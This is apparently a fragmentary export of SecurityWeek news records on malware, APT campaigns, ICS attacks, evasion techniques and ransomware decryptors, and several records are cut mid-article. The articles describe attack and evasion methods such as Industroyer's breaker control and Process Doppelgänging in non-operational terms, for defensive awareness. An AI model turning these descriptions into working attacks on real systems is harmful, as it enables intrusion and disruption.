posed by Java, 55% of respondents say it is nearly impossible to replace it with a less risky alternative. Although the main approaches to detecting APTs are intrusion detection systems (IDS), anti-malware software and intrusion prevention systems (IPS), more than half of the respondents say they discovered an APT by accident.  On average, it took about 225 days to detect APTs launched against an organization, according to the study.

The malware is believed to have been used in the December 2016 attack aimed at an electrical substation in Ukraine. The malware was discovered by ESET, which has dubbed it Industroyer. The company has also shared some data with ICS cybersecurity company Dragos, which tracks it as CRASHOVERRIDE and the threat actor that uses it as ELECTRUM. Links to Ukraine power grid attacks Malware designed to specifically target industrial control systems (ICS) is rare – Industroyer is only the fourth such threat known to the cybersecurity community. The other ICS-tailored malware families are Stuxnet, used in the 2010 attack targeting Iranian nuclear facilities, BlackEnergy, used in the December 2015 Ukraine power grid attacks, and Havex, used mainly against organizations in Europe. While they could not confirm that Industroyer/CRASHOVERRIDE was the direct cause of the 2016 power outages in Ukraine’s Kiev region, which are believed by many to be the work of Russia, both ESET and Dragos – based on compilation dates and other data – are fairly confident that this is the malware used in the attack. Dragos believes the ELECTRUM actor has direct ties to the BlackEnergy (Sandworm) group, and ESET pointed out that while there are no code similarities between the malware used in the 2015 and 2016 Ukraine attacks, some components are similar in concept. Attack scenarios Industroyer has been described as a sophisticated modular malware that has several components: a backdoor, a launcher, a data wiper, various tools, and at least four payloads. These payloads are the most interesting component as they allow the malware’s operators to control electric circuit breakers. In one theoretical attack scenario described by Dragos in its report, malicious actors use the malware to open closed breakers in an infinite loop, causing the substation to de-energize. By executing commands in an infinite loop, the attackers ensure that operators of the targeted facility cannot close the breakers from the HMI. This can require operators to interrupt communications with the substation and manually address the issue, which could result in an outage that lasts for a few hours. In another scenario described by researchers, the attackers initiate an infinite loop where breakers continually open and close, which can trigger protections and cause the substation to go offline. Experts believe that launching such an attack in a coordinated fashion against multiple sites could result in outages that last for a few days. Industroyer/CRASHOVERRIDE components The malware’s main backdoor component allows attackers to execute various commands on the infected system. It communicates with its command and control (C&C) servers over the Tor network and it can be programmed to be active only at specified times, which are likely mechanisms for avoiding detection. This component also deploys a secondary backdoor disguised as a trojanized version of the Windows Notepad application. The main backdoor is also responsible for installing the launcher component, which initiates the wiper and the payloads. Learn More at SecurityWeek’s 2017 ICS Cyber Security Conference The wiper is apparently designed for the final stages of the attack to help the attackers hide their tracks and make it more difficult to restore affected systems. This includes clearing registry keys, and overwriting ICS configuration and Windows files. The payloads, which allow attackers to control circuit breakers, leverage industrial communication protocols. This suggests that at least some of the malware’s developers have a deep understanding of power grid operations and industrial network communications. Other tools tied to the Industroyer malware include a custom-built port scanner and a denial-of-service (DoS) tool that exploits CVE-2015-5374 to cause Siemens SIPROTEC relays to become unresponsive. While the samples analyzed by ESET and Dragos can be used to target other energy organizations in Europe and some parts of the Middle East, the malware could also be adapted for attacks targeting the North American grid. Researchers at Dragos pointed out that while CRASHOVERRIDE appears to be designed to specifically target the energy sector, attackers could create new modules for other types of targets. " }

{ "_id" : { "$oid" : "5b27c4a56cefc41c844ab390" }, "Category" : "Malware", "Title" : "Air-Gapped Computers Can Communicate Through Heat: Researchers", "Address" : "https://www.securityweek.com/air-gapped-computers-can-communicate-through-heat-researchers", "Date" : "March 24, 2015", "Article" : "BitWhisper: Stealing Data From Isolated Computers Using Heat Emissions and Built-in Thermal Sensors Researchers at the Ben Gurion University in Israel have demonstrated that two computers in close proximity to each other can communicate using heat emissions and built-in thermal sensors. In an experimental scenario involving two debitvices placed at up to 15 inches from each other, researchers have managed to transmit up to 8 bits of data per hour, which is enough for exfiltrating sensitive data such as passwords and secret keys, and for sending commands. This novel attack method has been dubbed BitWhisper. It is not uncommon for organizations that handle highly sensitive information to isolate certain computers in order to protect valuable assets. Air-gap security is often used for industrial control systems (ICS) and military networks. However, as it has been demonstrated before, such as in the case of the notorious Stuxnet worm which targeted Iranian nuclear facilities, air-gap security can be breached. Over the past months, Ben Gurion University researchers have analyzed several techniques that can be leveraged to exfiltrate data from an air-gapped computer, including by using radio signals emitted by a device’s graphics card, and by using a multifunctional printer to receive and transmit data. Now, experts have demonstrated that a bidirectional communication channel can be established between two standard computers by using the heat emitted by various components, such as the CPU and the GPU. An attacker simply needs to plant a piece of malware on each of the PCs that need to communicate. In their experimental scenario, researchers placed two computers parallel to each other on a desk located in a standard office environment. One of the devices was connected to the Internet, while the other was connected to the internal network. This is a common scenario in many organizations where employees are required to carry out sensitive tasks on an air-gapped system while still needing access to the Internet.  Infecting the Internet-connected device with malware is not a difficult task. As demonstrated numerous times before, a piece of malware can be easily delivered using spear-phishing emails and social engineering techniques. Planting a threat on an isolated system is possible through attacks on the supply chain, infected USB drives, or with the aid of malicious insiders, researchers explained in a paper that will be published in the upcoming days. Once the malware is in place on both computers, heating patterns are generated on the sender device by controlling the CPU or GPU workload, which results in modifications in temperature. In the meantime, the receiving PC monitors the temperature changes using the thermal sensors built into the CPU, the GPU, the motherboard, or other components. “BitWhisper establishes a covert channel by emitting heat from one PC to the other in a controlled manner. By regulating the heating patterns, binary data is modulated into thermal signals. In turn, the adjacent PC uses its built-in thermal sensors to measure the environmental changes. These changes are then sampled, processed, and demodulated into binary data,” researchers explained. While BitWhisper is highly complex, with numerous variables that must be taken into consideration for the attack to be successful, the method doesn’t require any dedicated or modified hardware, experts noted. In addition to stealing sensitive information from air-gapped devices, the BitWhisper method can also be used for a worm attack or to send malicious commands to isolated ICS. “After infecting the networks, the malware spreads over both networks and searches the surroundings for additional PCs within close proximity, spatially. Proximity is determined by periodically sending ‘thermal pings’ over the air,” researchers explained. “Once a bridging attempt is successful, a logical link between the public network and the internal network in established. At this stage, the attacker can communicate with the formerly isolated network, issuing commands and receiving responses.” In a video demonstrating the capabilities of a BitWhisper prototype, researchers have used a USB missile launcher to shown that one air-gapped computer can send commands to another air-gapped device using only thermal radiation.

The threat actor, tracked as APT34 by FireEye and OilRig by other companies, has been active since at least 2014, targeting organizations in the financial, government, energy, telecoms and chemical sectors, particularly in the Middle East. Back in April, researchers noticed that APT34 had started exploiting an Office vulnerability (CVE-2017-0199) in attacks aimed at Israeli organizations shortly after Microsoft released a patch. The cyberspies have now also started leveraging CVE-2017-11882, an Office vulnerability patched by Microsoft on November 14. FireEye said it had spotted an attack exploiting this flaw less than a week after the fix was released. The remote code execution vulnerability affects the Equation Editor (EQNEDT32.EXE) component of Office and it has been around for 17 years. Some believe Microsoft may have addressed the security hole by directly modifying the executable, suggesting that the company may have lost its source code. Proof-of-concept (PoC) exploits were made available for CVE-2017-11882 shortly after Microsoft released a patch and, in late November, researchers reported that a cybercrime group tracked as Cobalt had started exploiting the vulnerability. However, FireEye saw the first attempt to exploit CVE-2017-11882 less than a week after Microsoft released a fix. The attack was aimed at a government organization in the Middle East. In July 2017, FireEye observed an APT34 attack using CVE-2017-0199 to deliver a backdoor tracked by the company as POWRUNER, and a downloader with DGA (domain generation algorithm) functionality named BONDUPDATER. In November, the group switched to using CVE-2017-11882 to deliver these PowerShell-based pieces of malware. The attackers used specially crafted RTF documents delivered to targeted users via spear phishing emails. When opened, the file triggers the Office vulnerability and initiates an infection process that ends with the execution of the backdoor and the downloader. POWRUNER allows attackers to collect information about the infected machine, download and upload files, and capture screenshots. Once it receives commands from its command and control (C&C) server, the malware stops running. The BONDUPDATER downloader is APT34’s first attempt at implementing a DGA for generating subdomains that are used for C&C communications. “We assess that APT34’s efforts to continuously update their malware, including the incorporation of DGA for C2, demonstrate the group’s commitment to pursuing strategies to deter detection,” FireEye said in a blog post. “We expect APT34 will continue to evolve their malware and tactics as they continue to pursue access to entities in the Middle East region.” This is not the first time FireEye has analyzed APT34’s activities. In May 2016, the security firm published a report detailing some of its attacks on banks in the Middle East, but at the time it did not attribute the operation to any group. Palo Alto Networks reported in October that OilRig had started using a new Trojan in attacks aimed at entities in the Middle East. " }

According to researchers at security firm Fidelis, the new version of Vawtrak includes a DGA that generates .ru domains with a length ranging between 7 and 12 characters (excluding the domain suffix). The domain names are generated using a pseudorandom number generator (PRNG) found in the Trojan’s loader. Another noteworthy feature is the use of HTTPS to protect C&C communications. While this is not uncommon, Vawtrak also leverages certificate pinning, or SSL pinning, which is fairly unusual. Normally, when an SSL connection is made, the client checks if the server’s certificate matches the requested hostname and that it has a verifiable chain of trust. SSL pinning provides extra protection against man-in-the-middle (MitM) attacks by ensuring that only a certificate specified by the user is accepted. In the case of Vawtrak, the use of SSL pinning helps the malware evade detection by enterprise security solutions that use their own certificates to intercept communications. In order to ensure that no other certificates are accepted, the Trojan conducts some checks based on the Common Name, which identifies the domain names associated with the certificate. It also uses a public key found in a header from the initial inject performed by the malware loader. “Vawtrak has been a very successful banking trojan, delivered via both mass-spam campaigns as well as through exploit kits. Keeping this in consideration, it's not surprising that new features and techniques are being introduced. The use of DGAs and TLS is widespread across various crime families, but SSL pinning is still rare,” Fidelis said in a blog post. Vawtrak, also known as Neverquest and Snifula, has been used to target online banking customers from across the world. The threat has been around for several years and it has been continually improved by its developers. " }

These attacks, observed by both Kaspersky and Cyphort, were launched shortly after the existence of the security hole was brought to light and proof-of-concept (PoC) exploits were made available. The vulnerability, tracked as CVE-2017-7494, affects all versions of Samba since 3.5.0 and it has been addressed with the release of versions 4.6.4, 4.5.10 and 4.4.14. The flaw allows a malicious client to upload a shared library to a writable share, and cause the server to execute the file. In the attacks spotted by researchers, cybercriminals attempted to deliver files with a random name and a .so extension (e.g. GJZjrflB.so, INAebsGB.so, cblRWuoCc.so). The attackers first identified writable shares to which they could deliver their payload. In earlier attacks, the cybercriminals attempted to guess the local path needed to exploit the vulnerability, but Cyphort noticed that they later turned to using the NetShareGetInfo method, which provides information about a particular shared resource on a server. The first file delivered is a backdoor that provides the attackers a reverse shell they can leverage to remotely execute commands. Experts pointed out that this part of the attack is based on the Metasploit module released shortly after CVE-2017-7494 was disclosed. The backdoor is used to download and execute a popular open-source cryptocurrency miner named cpuminer (miderd). The miner is configured to abuse compromised systems to mine Monero (XMR) and send it to a wallet whose address is hardcoded. Kaspersky analyzed the wallet and found that, as of June 8, the attackers had obtained nearly 100 Monero, which is currently worth roughly $5,500. The domain from which the mining utility is downloaded was registered on April 29 and the attackers’ wallet started receiving Monero the next day. During the first two weeks the wallet received only one Monero per day, but the amount increased following the disclosure of CVE-2017-7494, and recently the attackers have been earning roughly 5 Monero each day. “The attacked machine turns into a workhorse on a large farm, mining crypto-currency for the attackers,” Kaspersky researchers said in a blog post. “In addition, through the reverse-shell left in the system, the attackers can change the configuration of a miner already running or infect the victim’s computer with other types of malware.” The Samba vulnerability has been found to affect many networking devices, including Cisco, Netgear, QNAP, Synology, Varitas and NetApp products.

The two bulletins deal with issues in Windows and Internet Explorer, respectively, and both address vulnerabilities that could lead to remote code execution. All together, Microsoft is releasing a total of nine bulletins. The remaining seven are rated 'Important' and involve a number of different products. \"There are two critical updates this month,\" said Chris Goettl, product manager at Shavlik Technologies. \"One is for IE and the OS, which means you have a critical update for all of your Windows systems this month. Is this going to be a continuation of the last few months of rather large IE updates resolving memory corruption issues?  I expect we will see over ten vulnerabilities, mostly relating to memory corruption, being resolved in this patch.\" The second critical update this month affects only Windows 7 and Windows 8 and 8.1. Ross Barrett, senior manager of security engineering at Rapid 7, opined that the issue could be either in an authentication mechanism or a service that might be listening remotely. \"A clue here is that the 'Media Center TV Pack' for Vista is vulnerable, but no edition of Vista is itself,\" he said. \"So, what components are common to the Media Center TV Pack  and Windows 7 Professional Edition?  The last times the Media Center TV Pack got patched was MS11-015 and MS11-076, one was related to malicious media files, the other insecure library loading, but both of those affected Vista core too. More details about this will be very interesting as they emerge, but this is likely the top patching priority, depending on exploitability.\" Among the seven non-critical bulletins, one impacts all supported versions of MS SQL Server. According to Microsoft's advisory, the vulnerability can be exploited to elevate privileges. Three other bulletins also address privilege escalation issues impacting Windows and Microsoft Server Software. Also tucked away among the 'important' bulletins is one addressing remote code execution in Microsoft Office and two others addressing security feature bypasses in Windows and the .NET Framework. \"With Black Hat and DEF CON happening this week, it will be interesting to see if Patch Tuesday contains any quick response to new threats identified there,\" blogged Russ Ernst, director of product management at Lumension. \"As we are all painfully aware, the bad guys move fast so we need to move faster.\" " }

Well known for leveraging macros in Microsoft Office documents to infect computers, Dridex now includes the ability to allow the malware to hold off executing until the malicious document is closed. \"In this case, the maldoc [malicious document] campaign resembles other attachment delivery campaigns, but the twist is in when the macro shows its true colors,\" according to Proofpoint. \"The user is enticed to enable macros and open the attachment, and when they open it, they see a blank page and, under the hood, nothing bad happens. Instead, the malicious action occurs when the document is closed. The macro payload, in this case, listens for a document close event, and when that happens, the macro executes.\" \"The expected behavior for most malware is for it to execute at the earliest opportunity available on the target system,\" the Proofpoint researchers continue. \"Realizing that immediate execution was a red flag to malware sandboxes and antivirus solutions, malware writers adjusted by coding their wares to 'wait' for short periods of time before executing, thereby avoiding sandboxes that would only check for malicious activity at initial launch.\" As sandboxes have also adjusted to wait, the ability of a malicious macro to run when the document closes increases the possible window of infection and forces a detection sandbox to monitor it for longer, the researchers explained. But regardless of how long the sandbox waits, the infection will not occur – and if the sandbox shuts down or exits without closing the document, the infection will never take place. \"Allowing macros to run can be risky, and it keeps getting riskier as malware writers continue to innovate and add new tools and techniques to their portfolio,\" the researchers blogged. During the past several months, the Dridex malware has been linked to attacks targeting banking customers all over the globe, including in the United States, U.K. and Canada. Researchers at Trustwave recently identified a spate of malicious emails with XML files laced with the malware. " }

Dubbed Linux.Lady.1, the malware is written in Google’s Go programming language and it uses various libraries that are available on GitHub. Go was first used to create malware in 2012, but it hasn’t been adopted by many cybercriminals. Once it infects a system, the Linux malware collects information on the infected machine, including the operating system, CPUs and processes. The harvested data is sent back to a command and control (C&C) server, which provides a configuration file for downloading a cryptocurrency mining application. The sample analyzed by Doctor Web delivered an application designed for Monero (XMR) mining. Monero is an open source cryptocurrency currently valued at only $2 per unit, but unlike Bitcoin, it can still be mined using personal computers. Researchers also noticed that Linux.Lady.1 is capable of spreading to other Linux computers on the infected network. It does this by attempting to connect to remote hosts over port 6379 without a password. Experts believe the attackers are likely hoping that the host has not been configured properly. If the connection is successful, Linux.Lady.1 downloads a script from a specified URL and adds it to the Cron scheduler of the infected device. This script, detected by Dr. Web as Linux.DownLoader.196, is responsible for downloading and installing a copy of the Linux Trojan on the compromised device. This is not the first time the security firm has found Linux malware. Over the past months, it has warned users about the Encoder ransomware, Ekoms spyware and the Xunpes backdoor. It’s also worth noting that Linux.Lady.1 is not the first Linux threat capable of mining for cryptocurrency. A couple of years ago, Symantec reported uncovering a Linux worm, called Darlloz, which leveraged infected systems to mine for Mincoins or Dogecoins. The malware targeted various types of systems, including routers, set-top boxes and IP cameras.

{ "_id" : { "$oid" : "5b27c4a86cefc41c844ab398" }, "Category" : "Malware", "Title" : "'Process Doppelgänging' Helps Malware Evade Detection", "Address" : "https://www.securityweek.com/process-doppelg%C3%A4nging-helps-malware-evade-detection", "Date" : "December 07, 2017", "Article" : "Researchers at enSilo have identified a new method that can be used by hackers to execute a piece of malware on any supported version of Windows without being detected by security products. The new technique, dubbed “Process Doppelgänging,” is similar to process hollowing, a code injection method that involves spawning a new instance of a legitimate process and replacing the legitimate code with malicious one. This technique has been used by threat actors for several years and security products are capable of detecting it. enSilo says it has now come up with a similar but more efficient method for executing malicious code, including ransomware and other types of threats, in the context of a legitimate process. Process Doppelgänging abuses the Windows loader to execute code without actually writing it to the disk, which makes it more difficult to detect an attack. According to researchers, when Process Doppelganging is used, the malicious code is correctly mapped to a file on the disk, just like in the case of a legitimate process – modern security solutions typically flag unmapped code. The method can also be leveraged to load malicious DLLs. Experts have successfully tested the technique on Windows 7, Windows 8.1 and Windows 10 against security products from Microsoft, AVG, Bitdefender, ESET, Symantec, McAfee, Kaspersky, Panda Security and Avast.  Doppelganging relies on transactional NTFS, which is designed to make it easier for app developers and administrators to handle errors and preserve data integrity. enSilo has found a way to make changes to an executable file via NTFS transactions without actually committing those modifications to the disk. Undocumented functionality of the Windows process loader is then abused to load the modified executable. The changes made to the original file are reverted in order to avoid leaving any trace. “We overwrite a legitimate file in the context of [an NTFS transaction],” enSilo said. “We then create a section from the modified file (in the context of the transaction) and create a process out of it. It appears that scanning the file while it's in transaction is not possible by the vendors we checked so far (some even hang) and since we rollback the transaction, our activity leaves no trace behind.” “There are a lot of technical challenges involved in making it work,”researchers explained. “One of the hardest challenges is that in order to run a process out of a section (not a file on disk) the process needs to be created using NtCreateProces, which means that most of the initialization must be done manually, which requires knowing a lot of undocumented details on process creation.” enSilo says its products can detect such an attack, which means other vendors can implement detection mechanisms as well, especially if the technique will be exploited in the wild. However, since the method abuses legitimate features, experts say it cannot be patched. The security firm disclosed its findings this week at the Black Hat Europe conference in London. Technical details and proof-of-concept (PoC) code will be made available shortly. " }

The Persirai backdoor is designed to target more than 1,000 IP camera models, and researchers said there had been roughly 120,000 devices vulnerable to this malware at the time of its discovery several weeks ago. The malware, which uses a recently disclosed zero-day vulnerability to spread from one hacked IP camera to another, allows its operators to execute arbitrary code on the targeted device and launch distributed denial-of-service (DDoS) attacks. Trend Micro has determined that of a total of 4,400 IP cameras it tracks in the United States, just over half have been infected with malware. The percentage of infected cameras spotted by the security firm in Japan is nearly 65 percent. According to the company, more than 64 percent of the total number of 3,675 compromised devices located in the United States, Japan, Taiwan and South Korea have been infected with Persirai. However, Persirai is not the only IoT malware targeting IP cameras. Trend Micro says there are three other malware families: Mirai, DvrHelper and TheMoon. Mirai made a lot of headlines recently due to the significant number of devices it infected all around the world. Data from Trend Micro shows that of the hijacked devices it is monitoring in the U.S., Japan, Taiwan and Korea, Mirai accounts for more than a quarter of infections. DvrHelper is based on Mirai, but its authors have implemented some interesting features, including additional DDoS modules and a mechanism for bypassing anti-bot solutions, including JavaScript-based challenges and Google’s reCAPTCHA system. Another threat targeting IP cameras is TheMoon. This is actually the oldest IoT malware, but its authors have continued to improve it. DvrHelper and TheMoon account for 6.8 percent and 1.4 percent of the infections seen by Trend Micro in the U.S. and the aforementioned East Asian countries. Researchers pointed out that since the number of potential victims for these malware families is limited, some of them are designed to “lock the door” behind them after they infect a device. For example, Persirai attempts to patch the zero-day vulnerability it exploits to prevent other malware from infecting the device. However, since the malware resides only in memory and the changes it makes are not persistent, the threat will be removed and the camera will become vulnerable once again after it’s restarted. TheMoon also tries to keep other malware out. It does this by importing specific iptables firewall rules to the device. " }

According to users, the attack encrypts files and demands the victim fork over 0.6 Bitcoins to regain access to them.  \"Based on our current observations, this issue only affects Synology NAS servers running some older versions of DSM (DSM 4.3-3810 or earlier), by exploiting a security vulnerability that was fixed and patched in December, 2013,\" according to the post by the company. \"At present, we have not observed this vulnerability in DSM 5.0.\" Users with Synology NAS servers running DSM 4.3-3810 or earlier should shut down their devices and contact Synology's support team if they encounter any of the following symptoms: • When attempting to log in to DSM, a screen appears informing users that data has been encrypted and a fee is required to unlock data. • A process called \"synosync” is running in Resource Monitor. • DSM 4.3-3810 or earlier is installed, but the system says the latest version is installed at Control Panel > DSM Update. The company advises users that have not encountered the symptoms mentioned above to download and install DSM 5.0, or any version below: • For DSM 4.3, please install DSM 4.3-3827 or later • For DSM 4.1 or DSM 4.2, please install DSM 4.2-3243 or later • For DSM 4.0, please install DSM 4.0-2259 or later DSM can be updated by going to Control Panel > DSM Update, and users can also manually download and install the latest version from the company's Download Center.

A new survey from Osterman Research however has found that many companies believe it would take hours or more for them to detect a breach – with nearly 30 percent stating it would take days, weeks or longer. The statistics come from a report entitled 'Dealing with Data Breaches and Data Loss Prevention'. The report – which was sponsored by Proofpoint - fielded responses from 225 large and midsized organizations in the U.S. and Canada. According to the survey, just 24 percent felt they could detect a breach within minutes or seconds. Thirty-seven percent believe they could detect a breach within hours, while 28 percent said it would take days or weeks. One percent said it would take even longer than that, and nine percent weren't sure. Joe Diamond, director of product marketing at Proofpoint, blogged that the numbers indicate that many organizations are not properly preparing for a breach. \"In just hours, let alone days or weeks, gigabytes of data can be exfiltrated,\" he wrote. \"Worse yet, as data stores continue to grow, so does the presence of unchecked sensitive data. This leaves the attack surface large and subject to exfiltration caused by targeted attacks and malicious/oblivious insiders.\" Despite research showing that strong executive leadership can be critical in the aftermath of an attack, just 29 percent of the respondents said they look to their CISO to manage initial breach response. In addition, only 33 percent have the CISO manage the follow-up phases of a breach. When participants were asked to rate their organization's preparedness to address data breaches if and when they occurred, some 68 percent described their organization as either \"very well prepared\" (6 percent), \"well prepared\" (27 percent) or \"prepared\" (35 percent). Fourteen percent said they were \"not well prepared\" or worse.  \"However, it is important to note that preparedness is only part of the story,\" according to the report. \"For example, Target was quite well prepared for its now-infamous data breach: the company had deployed a robust anti-malware solution to protect against data breaches, it maintained a team of security personnel in India that were focused on detecting anomalous behavior in the corporate network, and it had a security team in Minneapolis that were focused on dealing with a data breach and other security incidents. Target’s security solution worked as it was designed, its Indian security team notified its counterparts of the breach in Minneapolis, but for some reason that final link in the chain did not respond appropriately.\" Fewer than half of the organizations in the survey have a data breach/cyber insurance policy, and about one-third have a data breach mitigation budget. Overall, 55 percent said that detecting and preventing data breaches are among their highest priorities in 2015, with nine percent calling it their highest priority. \"If you don’t understand your attack surface—that is, where the sensitive data is and who has access to it—it’s nearly impossible to be 'breach ready',\" blogged Diamond. \"It’s true that malicious outsiders are launching targeted attacks in your direction in an attempt to penetrate perimeter defenses. And let’s just assume you have the requisite security stack in place that will enable detection and response. But, fact is, you’ve got plenty of exfiltrators exfiltrating to exfiltratees, if you will, that reside within your organization's respective firewall. Simply put, it’s just as important to protect against insiders as at is outsiders.\" " }
{ "_id" : { "$oid" : "5b27c4ab6cefc41c844ab39d" }, "Category" : "Malware", "Title" : "Decryption Tools Released for Bart, PowerWare Ransomware", "Address" : "https://www.securityweek.com/decryption-tools-released-bart-powerware-ransomware", "Date" : "July 22, 2016", "Article" : "Researchers have released free tools that allow victims of the Bart and PowerWare file-encrypting ransomware families to recover their data without paying the cybercriminals. PowerWare, which can be considered a successor of PoshCoder, emerged in March when it was spotted targeting healthcare organizations. An analysis conducted at the time revealed that victims using security products that capture traffic might be able to recover their files since the malware sent the encryption key in plain text back to its server. Researchers at Palo Alto Networks have recently come across a variant of PowerWare that claims to be the Locky ransomware – it uses the .locky extension for encrypted files, the ransom note is identical, and the file recovery website references Locky. Experts from Palo Alto Networks noticed that this PowerWare variant uses a static encryption key and it actually only encrypts the first 2048 bytes of each file. This has allowed the security firm to release a decryption script that searches the infected system for .locky files and restores them to their original state. On Tuesday, antivirus company AVG announced that it has found a way to recover files encrypted by Bart ransomware, which is similar to Locky, but it doesn’t require a command and control (C&C) server to take files hostage. Bart is designed to use password-protected ZIP archives to encrypt files with the extension .bart.zip. The Bart decryption tool uses a library called PkCrack to conduct a known plaintext attack that helps break the cipher. For AVG’s tool to work, victims must provide an encrypted file and a copy of the original file. Obtaining a copy of an original file is not difficult. Users can select a file that was backed up or one that was sent to them via email. Another option is to simply download a standard Windows audio or image file from the Web and add it to the decryption tool along with the encrypted version. Researchers have managed to create decryption tools for several pieces of ransomware, either because the encryption mechanism contained flaws or because cybercriminals had a change of heart and decided to publish the decryption keys. The list of ransomware families for which experts released recovery tools includes Locker, CryptXXX, Jigsaw, TeslaCrypt, Petya, Linux.Encoder, Coinvault, Radamant, CryptInfinite and Bitcryptor. " }

The malware, tracked by the company as Linux.MulDrop.14, has been described as a script that contains a compressed and encrypted cryptocurrency miner. The Trojan attempts to connect to a device via SSH using the default credentials – the username “pi” and the password “raspberry.” If the device is successfully infected, the miner is unpacked and executed. The Trojan then changes the device’s password and starts looking for other Raspberry Pi computers it can connect to via SSH over port 22. MulDrop, which researchers first spotted in mid-May, uses the ZMap scanner to search for other victims, and the sshpass utility to connect to them. The process for attempting to infect other devices takes place in an infinite loop, Dr. Web said. An update released in November 2016 for the Raspbian operating system disables the SSH server by default. Users who have SSH enabled on their Raspberry Pi have been advised to change their default password to prevent attacks. Raspberry Pi devices have been targeted by malware in the past. Symantec reported last year that Internet of Things (IoT) malware that abused infected devices for distributed denial-of-service (DDoS) attacks had also targeted Raspberry Pis. Another Linux Trojan discovered recently by Dr. Web is Linux.ProxyM, which has been around since February. The number of ProxyM attacks peaked in late May with roughly 10,000 attempts per day. Nearly one-third of the attacks were traced to Russia, and other offending IPs were linked to China (13%), Taiwan (10%) and Brazil (9%). ProxyM has been used by malicious actors to cover their tracks online. Once it infects a Linux device, the Trojan uses various methods to detect honeypots. If a honeypot is not detected, the malware contacts a command and control (C&C) server and initiates a SOCKS proxy server on the compromised machine. " }

The company provides a platform designed to test an organization’s defenses by continuously simulating attacks and breaches. For the third edition of its Hacker’s Playbook report, SafeBreach has analyzed data from roughly 11.5 million automated simulations conducted between January and November 2017. The simulations covered more than 3,400 attack methods – from exploit kits and malware to brute force and credential harvesting – that allowed the company to see where attackers are blocked and where they are successful. An analysis of the top 5 infiltration methods used by malware showed that more than 55 percent of attack attempts are successful. The methods used by notorious malware families such as the WannaCry ransomware, which leverages SMB, and the Carbanak (Anunak) banking Trojan, which relies on HTTP, had a success rate of 63.4% and 59.8%, respectively, in SafeBreach’s simulations. Other popular infiltration methods involve malicious executables packed in CHM, VBS and JavaScript files. These help attackers trick both end users and high-level scanners, and they had success rates between 50% and 61%. Once they gain access to a targeted organization’s network, attackers use various methods for lateral movement. The most common methods, all of which involve a piece of malware or exploit, were successful in 65%-70% of the simulations run by SafeBreach. The relatively high success rates show that organizations often fail to implement proper segmentation controls. Once the perimeter has been breached, there is no malware scanning in place within the network, allowing attackers to easily move from one machine to another. As for exfiltrating data, success rates range between 40% and 57% for methods involving MySQL queries, TLS, SSL, HTTP POST and HTTP GET. The most commonly targeted ports are 123 (NTP), 443 (HTTPS), and 80 (HTTP).  “Attackers will always try the easiest routes first - and sadly, it appears they will often find success,” SafeBreach said in its report. “Techniques like DNS tunneling, or trickling data out within packet headers to slowly steal data without raising suspicion are clever, but attackers don’t get bonus points for creativity. When simply sending data outbound via clear or encrypted web traffic will work - attackers will happily take the easy way out.” “We also took a deeper look into this traffic, and validated that indeed traditional web traffic, over traditional web ports, is the leading risk of data exfiltration. However, some sneakier tactics were also highlighted, as we were often able to sneak data out over NTP - which is often open and unscanned,” the company added. WannaCry, Locky and Cryptolocker have made many organizations realize that ransomware should be taken seriously. However, SafeBreach found that these types of attacks are often successful even if the deployed security solutions are working as designed. The security firm pointed out that most of its customers have managed to significantly reduce attack success rates simply by optimizing existing security controls. “Security teams already have the tools/controls they need for security. Oftentimes, teams chase after every new security fad, when they should be optimizing their current technology,” SafeBreach told SecurityWeek. " }

On Nov. 27, Microsoft warned it was investigating reports of a vulnerability in a kernel component in Windows XP and Windows Server 2003. If exploited, the vulnerability can be used to enable an attacker to escalate privileges and run arbitrary code in kernel mode – permitting them to install programs, view data or take other actions with full administrative rights.   The issue is being exploited using a malicious PDF file to deliver a backdoor that has a few tricks up its sleeve.   \"As a first step to thwart debugging, the malware creates a new thread which continues its malicious routines,\" blogged Jayronn Christian Bucu, senior research engineer at Trend Micro. \"The original thread is then deleted, blocking debugging. It also makes an API call to NtSetInformationThread for the newly-created thread it created. This is commonly used to set the execution priority of a thread. However, the malware sets the THREADINFOCLASS to 0×11 (ThreadHideFromDebugger). This prevents debug information from the new thread from being sent to the debugger.\"   \"This is normally done by RtlQueryProcessDebugInformation to prevent deadlock in certain debugging scenarios, such as remote debugging,\" the researcher added. \"However, here it prevents the debugger from gathering information, making analysis more difficult.\"   The malware also reuses many portions of its existing code, which poses both positives and negatives for analysts. The benefit, Bucu explained, is that since the code to be injected is a copy of the currently running code, it eliminates the need for re-analysis. The downside however is that if the attacker has placed several breakpoints on the current executing code and wasn't able to remove them, the malware code would be injected with the patched breakpoint. Meanwhile, debuggers implement breakpoints by putting INT3 in the code being debugged.   \"The end result would be that the patched shellcode would be patched with multiple occurrences of INT3. This would mean that the target process would itself be frozen,\" Bucu blogged. \"Consider a case where the injected process is explorer.exe. When INT3 is executed in its context, explorer.exe would freeze, affecting the debugging environment (unless it, too was attached to the debugger.) This complicates the debugging process for an unwary analyst.\"   The malware's author or authors also took the step of designing the creation so that it refuses to run its malicious routines if it finds any of the following network tool processes running:     \"Our findings indicate that whoever was responsible for this attack was capable of some sophistication,\" Bucu noted. \"Not only was BKDR_TAVDIG.GUD delivered by a malware exploiting a zero-day vulnerability, the backdoor also uses multiple techniques in order to try and make analysis more difficult.\"   The researcher advised Windows XP and Windows Server 2003 users to be mindful of Microsoft's plans to end support in 2014 and 2015, respectively.   While Microsoft works on a patch for the vulnerability, the company advises Windows XP and Windows Server 2003 users to reroute the NDProxy service to Null.sys. " }

CryptoLocker has been designed to encrypt the most important files found on infected computers and keep them that way until victims pay the ransom demanded by the attackers. The threat has helped cybercriminals make millions of dollars from internauts and companies located all over the world. In June, law enforcement agencies and private sector companies announced that a major takedown operation targeting the Gameover Zeus botnet had also hit CryptoLocker. While new infections have been prevented, there are still a large number of users whose files remain encrypted. FireEye and Fox-IT have managed to obtain many of the private keys associated with the malware, so they've launched a free service which they've dubbed DecryptCryptoLocker. The service provides users with the private keys needed to decrypt the files encrypted by CryptoLocker, and assistance on how to use them.  In order to recover their files, victims must first identify one encrypted file that is unlikely to contain any sensitive information. They must upload the said file to the DecryptCryptoLocker portal, and provide an email address to which the private key can be sent.  Users are then instructed to download a command-line tool called Decryptolocker.exe and wait for the key for their encrypted files to be delivered via email. Once the key is obtained, the tool must be executed in the Windows Command Prompt by using the following syntax: Decryptolocker.exe –key “<key>” <Lockedfile.doc> In a blog post published on Wednesday, FireEye has clarified that there are several CryptoLocker variants and it's possible that the DecryptCryptoLocker tool will only work for some of them. Furthermore, while the companies have obtained a large number of keys, there's no guarantee that they'll be able to help all victims.  \"We are excited to work with Fox-IT to offer a free resource that can help thousands of businesses affected by the spread of CryptoLocker over the last few months,\" noted Darien Kindlund, 